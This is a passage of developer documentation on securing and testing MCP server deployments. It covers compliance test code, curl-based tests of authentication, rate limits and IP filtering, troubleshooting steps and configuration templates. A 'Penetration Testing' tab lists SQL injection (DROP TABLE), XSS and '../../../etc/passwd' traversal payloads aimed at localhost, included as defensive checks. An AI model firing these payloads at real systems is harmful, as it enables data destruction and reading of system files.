describe('MCP Compliance Testing', () => {
  let tester: MCPComplianceTester;

  beforeEach(() => {
    tester = new MCPComplianceTester({
      baseUrl: 'http://localhost:6001',
      complianceStandards: ['GDPR', 'HIPAA', 'SOX']
    });
  });

  describe('GDPR Compliance', () => {
    it('should support data subject rights', async () => {
      const dataSubjectId = 'test-user-123';

      // Test right to access
      const accessResult = await tester.testDataAccess({
        subjectId: dataSubjectId,
        requestType: 'access'
      });
      expect(accessResult.granted).toBe(true);
      expect(accessResult.dataReturned).toBeDefined();

      // Test right to rectification
      const rectificationResult = await tester.testDataRectification({
        subjectId: dataSubjectId,
        corrections: { email: 'newemail@example.com' }
      });
      expect(rectificationResult.updated).toBe(true);

      // Test right to erasure
      const erasureResult = await tester.testDataErasure({
        subjectId: dataSubjectId,
        requestType: 'erasure'
      });
      expect(erasureResult.deleted).toBe(true);
    });

    it('should implement data protection by design', async () => {
      const result = await tester.testDataProtectionByDesign({
        dataTypes: ['personal', 'sensitive'],
        processingPurpose: 'mcp_tool_execution'
      });
      expect(result.minimizationImplemented).toBe(true);
      expect(result.purposeLimitationEnforced).toBe(true);
      expect(result.storageMinimized).toBe(true);
    });

    it('should maintain consent records', async () => {
      const result = await tester.testConsentManagement({
        subjectId: 'test-user-123',
        processingPurpose: 'mcp_tool_execution',
        consentType: 'explicit'
      });
      expect(result.consentRecorded).toBe(true);
      expect(result.consentTimestamp).toBeDefined();
      expect(result.consentWithdrawalSupported).toBe(true);
    });
  });

  describe('HIPAA Compliance', () => {
    it('should implement access controls for PHI', async () => {
      const result = await tester.testPHIAccessControls({
        userRole: 'healthcare_provider',
        patientId: 'patient-123',
        accessType: 'read'
      });
      expect(result.accessGranted).toBe(true);
      expect(result.auditLogged).toBe(true);
      expect(result.minimumNecessaryEnforced).toBe(true);
    });

    it('should maintain audit logs', async () => {
      const result = await tester.testAuditLogging({
        operation: 'phi_access',
        userId: 'doctor-456',
        patientId: 'patient-123'
      });
      expect(result.auditRecorded).toBe(true);
      expect(result.auditFields).toContain('timestamp');
      expect(result.auditFields).toContain('user_id');
      expect(result.auditFields).toContain('patient_id');
      expect(result.auditFields).toContain('operation');
    });

    it('should encrypt PHI at rest and in transit', async () => {
      const result = await tester.testPHIEncryption({
        dataLocation: 'both', // rest and transit
        encryptionStandard: 'AES-256'
      });
      expect(result.encryptionAtRest).toBe(true);
      expect(result.encryptionInTransit).toBe(true);
      expect(result.keyManagementSecure).toBe(true);
    });
  });

  describe('SOX Compliance', () => {
    it('should implement segregation of duties', async () => {
      const result = await tester.testSegregationOfDuties({
        operation: 'financial_data_access',
        userId: 'analyst-789',
        approvalRequired: true
      });
      expect(result.segregationEnforced).toBe(true);
      expect(result.approvalObtained).toBe(true);
      expect(result.auditTrailComplete).toBe(true);
    });

    it('should maintain financial data integrity', async () => {
      const result = await tester.testDataIntegrity({
        dataType: 'financial',
        operation: 'modification',
        userId: 'accountant-321'
      });
      expect(result.integrityMaintained).toBe(true);
      expect(result.changeLogged).toBe(true);
      expect(result.approvalRequired).toBe(true);
    });

    it('should support retention policies', async () => {
      const result = await tester.testRetentionPolicies({
        dataType: 'financial_records',
        retentionPeriod: '7_years',
        disposalMethod: 'secure_deletion'
      });
      expect(result.retentionPolicyEnforced).toBe(true);
      expect(result.disposalScheduled).toBe(true);
      expect(result.disposalMethodSecure).toBe(true);
    });
  });
});
```

</Tab>

</Tabs>

## Security Testing

<Tabs items={["Authentication Testing", "Rate Limiting Testing", "IP Filtering Testing", "Security Headers Testing", "Penetration Testing"]}>
<Tab value="Authentication Testing">

Test different authentication scenarios:

```bash
# Test valid authentication
curl -H "Authorization: Bearer $MCP_AUTH_TOKEN" \
  http://localhost:6001/api/v1/mcp/list

# Test invalid token (should return 401)
curl -H "Authorization: Bearer invalid-token" \
  http://localhost:6001/api/v1/mcp/list

# Test missing authorization header (should return 401)
curl http://localhost:6001/api/v1/mcp/list

# Test malformed authorization header (should return 401)
curl -H "Authorization: InvalidFormat" \
  http://localhost:6001/api/v1/mcp/list

# Test expired token (JWT)
curl -H "Authorization: Bearer $EXPIRED_JWT_TOKEN" \
  http://localhost:6001/api/v1/mcp/list
```

</Tab>

<Tab value="Rate Limiting Testing">

Test rate limiting mechanisms:

```bash
# Test rate limiting - should trigger 429 after threshold
for i in {1..100}; do
  echo "Request $i:"
  curl -w "Status: %{http_code}, Time: %{time_total}s\n" \
    -H "Authorization: Bearer $TOKEN" \
    http://localhost:6001/api/v1/mcp/list
  sleep 0.1
done

# Test burst capacity
for i in {1..20}; do
  curl -H "Authorization: Bearer $TOKEN" \
    http://localhost:6001/api/v1/mcp/list &
done
wait

# Test per-IP rate limiting
curl -H "X-Forwarded-For: 192.168.1.100" \
  -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/api/v1/mcp/list
```

</Tab>

<Tab value="IP Filtering Testing">

Test IP whitelist and blacklist functionality:

```bash
# Test allowed IP (should succeed)
curl -H "X-Forwarded-For: 127.0.0.1" \
  -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/api/v1/mcp/list

# Test blocked IP (should return 403)
curl -H "X-Forwarded-For: 192.168.1.100" \
  -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/api/v1/mcp/list

# Test network range
curl -H "X-Forwarded-For: 192.168.1.50" \
  -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/api/v1/mcp/list

# Test IPv6 addresses
curl -H "X-Forwarded-For: ::1" \
  -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/api/v1/mcp/list
```

</Tab>

<Tab value="Security Headers Testing">

Verify security headers are properly set:

```bash
# Test security headers
curl -I -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/api/v1/mcp/list

# Test CORS headers
curl -I -H "Origin: https://example.com" \
  -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/api/v1/mcp/list

# Test preflight request
curl -I -X OPTIONS \
  -H "Origin: https://example.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization" \
  http://localhost:6001/api/v1/mcp/list
```

</Tab>

<Tab value="Penetration Testing">

Basic security validation tests:

```bash
# Test SQL injection attempts (should be blocked)
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:6001/api/v1/mcp/tools/call" \
  -d '{"mcpName": "database", "toolName": "query", "arguments": {"sql": "SELECT * FROM users; DROP TABLE users;"}}'

# Test XSS attempts (should be sanitized)
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:6001/api/v1/mcp/tools/call" \
  -d '{"mcpName": "web", "toolName": "render", "arguments": {"html": "<script>alert(\"XSS\")</script>"}}'

# Test directory traversal (should be blocked)
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:6001/api/v1/mcp/tools/call" \
  -d '{"mcpName": "filesystem", "toolName": "read", "arguments": {"path": "../../../etc/passwd"}}'
```

</Tab>
</Tabs>

### Security Troubleshooting

<Accordion>
<AccordionItem title="Authentication Issues">
<AccordionContent>

**Common authentication problems and solutions:**

<Steps>
<Step title="401 Unauthorized Errors">
```bash
# Check token validity
echo $MCP_AUTH_TOKEN | base64 -d

# Verify token format
curl -H "Authorization: Bearer $MCP_AUTH_TOKEN" \
  http://localhost:6001/api/v1/mcp/list -v

# Check token expiration (for JWT)
jwt decode $JWT_TOKEN
```

**Solution**: Regenerate tokens or check token format and expiration.
</Step>

<Step title="Token Not Found">
```bash
# Check environment variables
env | grep MCP_

# Verify token is properly loaded
echo "Token: $MCP_AUTH_TOKEN"
```

**Solution**: Ensure environment variables are properly set and loaded.
</Step>

<Step title="Invalid Token Format">
```bash
# Check authorization header format
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/api/v1/mcp/list -v 2>&1 | grep "Authorization"
```

**Solution**: Ensure proper "Bearer " prefix and base64 encoding.
</Step>
</Steps>

</AccordionContent>
</AccordionItem>

<AccordionItem title="Rate Limiting Issues">
<AccordionContent>

**Rate limiting troubleshooting:**

<Steps>
<Step title="429 Too Many Requests">
```bash
# Check current rate limit status
curl -I -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/api/v1/mcp/list

# Look for rate limit headers
grep -i "rate-limit" response_headers.txt
```

**Solution**: Implement exponential backoff or increase rate limits.
</Step>

<Step title="Rate Limit Not Working">
```bash
# Test rate limiting configuration
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/admin/config/rate-limits

# Check rate limit metrics
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://localhost:6001/admin/metrics/rate-limits
```

**Solution**: Verify rate limit configuration and middleware order.
</Step>
</Steps>

</AccordionContent>
</AccordionItem>

<AccordionItem title="IP Filtering Issues">
<AccordionContent>

**IP filtering troubleshooting:**

<Steps>
<Step title="403 Forbidden from Valid IP">
```bash
# Check real client IP
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/admin/debug/client-ip

# Test with different IP headers
curl -H "X-Real-IP: 127.0.0.1" \
  -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/api/v1/mcp/list
```

**Solution**: Check proxy configuration and IP header precedence.
</Step>

<Step title="IP Whitelist Not Working">
```bash
# Verify IP whitelist configuration
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://localhost:6001/admin/config/ip-whitelist

# Test IP parsing
curl -H "X-Forwarded-For: 192.168.1.1" \
  -H "Authorization: Bearer $TOKEN" \
  http://localhost:6001/api/v1/mcp/list -v
```

**Solution**: Verify CIDR notation and IP parsing logic.
</Step>
</Steps>

</AccordionContent>
</AccordionItem>

<AccordionItem title="CORS Issues">
<AccordionContent>

**CORS troubleshooting:**

<Steps>
<Step title="CORS Preflight Failures">
```bash
# Test preflight request
curl -I -X OPTIONS \
  -H "Origin: https://example.com" \
  -H "Access-Control-Request-Method: POST" \
  http://localhost:6001/api/v1/mcp/list

# Check CORS headers
curl -I -H "Origin: https://example.com" \
  http://localhost:6001/api/v1/mcp/list
```

**Solution**: Verify CORS configuration and allowed origins.
</Step>

<Step title="Credentials Not Allowed">
```bash
# Test with credentials
curl -H "Origin: https://example.com" \
  -H "Authorization: Bearer $TOKEN" \
  --cookie "session=abc123" \
  http://localhost:6001/api/v1/mcp/list
```

**Solution**: Set `allow_credentials: true` in CORS configuration.
</Step>
</Steps>

</AccordionContent>
</AccordionItem>
</Accordion>

### Security Configuration Template

```yaml
# Production security configuration
mcps:
  - id: production_mcp
    url: "https://mcp.example.com"
    auth:
      type: token
      token: "{{ .env.MCP_PRODUCTION_TOKEN }}"
      header: "Authorization"
      prefix: "Bearer"

    security:
      # IP restrictions
      ip_whitelist:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"

      # Rate limiting
      rate_limit:
        requests_per_minute: 60
        burst_size: 10
        per_ip_requests_per_minute: 10

      # CORS configuration
      cors:
        enabled: true
        allowed_origins:
          - "https://app.example.com"
        allowed_methods: ["GET", "POST"]
        allow_credentials: true
        max_age: 86400

      # TLS configuration
      tls:
        enabled: true
        min_version: "1.2"
        cipher_suites:
          - "TLS_AES_128_GCM_SHA256"
          - "TLS_AES_256_GCM_SHA384"
```

This comprehensive security configuration ensures your MCP deployments are protected against common threats while maintaining performance and usability.

## Security Reference Cards

<ReferenceCardList>
<ReferenceCard title="Security Monitoring" description="Essential security monitoring and alerting patterns">

**Key Metrics to Monitor:**
- Authentication success/failure rates
- Rate limiting violations
- IP blacklist hits
- Security header violations
- Token usage patterns
- Anomalous request patterns

**Alert Thresholds:**
- Auth failure rate > 10% over 5 minutes
- Rate limit exceeded > 100 times/hour
- New IP countries appearing
- Off-hours access patterns
- Privilege escalation attempts

**Response Procedures:**
1. Immediate: Block suspicious IPs
2. Short-term: Rotate compromised tokens
3. Long-term: Security incident analysis

</ReferenceCard>

<ReferenceCard title="Security Checklist" description="Pre-deployment security validation">

**Pre-Production Checklist:**
- [ ] Strong tokens generated and stored securely
- [ ] IP whitelist configured for production IPs
- [ ] Rate limiting enabled and tested
- [ ] HTTPS/TLS configured with valid certificates
- [ ] Security headers implemented
- [ ] CORS properly configured
- [ ] Audit logging enabled
- [ ] Monitoring and alerting set up
- [ ] Security testing completed
- [ ] Incident response plan documented

**Regular Maintenance:**
- [ ] Rotate authentication tokens monthly
- [ ] Review IP whitelist quarterly
- [ ] Update security headers annually
- [ ] Test disaster recovery procedures
- [ ] Security audit and penetration testing

</ReferenceCard>

<ReferenceCard title="Common Security Patterns" description="Reusable security implementation patterns">

**Token-Based Auth Pattern:**
```yaml
auth:
  type: token
  token: "{{ .env.MCP_AUTH_TOKEN }}"
  header: "Authorization"
  prefix: "Bearer"
```

**IP Whitelisting Pattern:**
```yaml
security:
  ip_whitelist:
    - "127.0.0.1"      # Local
    - "10.0.0.0/8"     # Private
    - "172.16.0.0/12"  # Private
    - "192.168.0.0/16" # Private
```

**Rate Limiting Pattern:**
```yaml
security:
  rate_limit:
    requests_per_minute: 60
    burst_size: 10
    per_ip_requests_per_minute: 10
```

**CORS Configuration:**
```yaml
security:
  cors:
    enabled: true
    allowed_origins: ["https://app.example.com"]
    allowed_methods: ["GET", "POST"]
    allow_credentials: true
```

</ReferenceCard>

<ReferenceCard title="Security Troubleshooting" description="Quick fixes for common security issues">

**Authentication Issues:**
- 401 Unauthorized  Check token validity and format
- Token not found  Verify environment variables
- Invalid token format  Ensure proper Bearer prefix

**Rate Limiting Issues:**
- 429 Too Many Requests  Implement exponential backoff
- Rate limit not working  Check middleware order
- Per-IP limits not working  Verify IP extraction

**IP Filtering Issues:**
- 403 from valid IP  Check proxy IP headers
- Whitelist not working  Verify CIDR notation
- IPv6 issues  Ensure IPv6 support enabled

**CORS Issues:**
- Preflight failures  Check OPTIONS handling
- Credentials not allowed  Set allow_credentials: true
- Origin not allowed  Verify allowed_origins list

**TLS/SSL Issues:**
- Certificate errors  Verify cert validity and chain
- Cipher suite issues  Update supported ciphers
- Protocol version  Ensure TLS 1.2+ support

</ReferenceCard>
</ReferenceCardList>

## Security Performance Impact

Understanding the performance implications of security features:

<Mermaid chart={`graph LR
    A[Raw Request] --> B[+2ms IP Check]
    B --> C[+1ms Token Validation]
    C --> D[+0.5ms Rate Limiting]
    D --> E[+0.3ms Security Headers]
    E --> F[+0.2ms CORS]
    F --> G[MCP Processing]

    subgraph "Security Overhead"
        H["Total: ~4ms additional latency"]
        I["Memory: ~1MB per 1000 concurrent connections"]
        J["CPU: <5% overhead under normal load"]
    end`} />

<Callout type="info">
  <Icon name="activity" className="w-4 h-4" />
  **Performance Optimization**: Security features add minimal overhead (< 5ms) but provide significant protection. The performance cost is negligible compared to the security benefits.
</Callout>

## Next Steps

- Configure [Storage Backends](/docs/core/mcp/storage-backends) for security tokens
- Set up [Monitoring & Metrics](/docs/core/mcp/monitoring-metrics) for security events
- Review [Production Deployment](/docs/core/mcp/production-deployment) security considerations
- Explore [Integration Patterns](/docs/core/mcp/integration-patterns) for secure workflows
